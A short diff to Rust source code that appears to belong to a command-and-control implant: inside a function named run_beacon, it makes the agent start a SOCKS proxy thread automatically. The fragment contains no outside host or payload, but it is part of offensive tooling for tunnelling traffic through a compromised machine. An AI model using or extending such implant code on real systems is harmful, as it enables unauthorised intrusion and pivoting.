@@ -68,6 +68,16 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
     // Create a new agent object
     let mut agent = crate::Agent::new();
 
+    // Start SOCKS thread automatically
+    let (socks_tx, socks_rx) = std::sync::mpsc::channel();
+    let socks_tx_clone = socks_tx.clone();
+    std::thread::spawn(move || {
+        if let Err(e) = crate::socks::start_socks(&socks_tx_clone, socks_rx) {
+            eprintln!("SOCKS thread error: {}", e);
+        }
+    });
+    eprintln!("DEBUG: SOCKS thread started");
+
     // Get the initial interval from the config
     let mut interval = payloadvars::callback_interval();
 
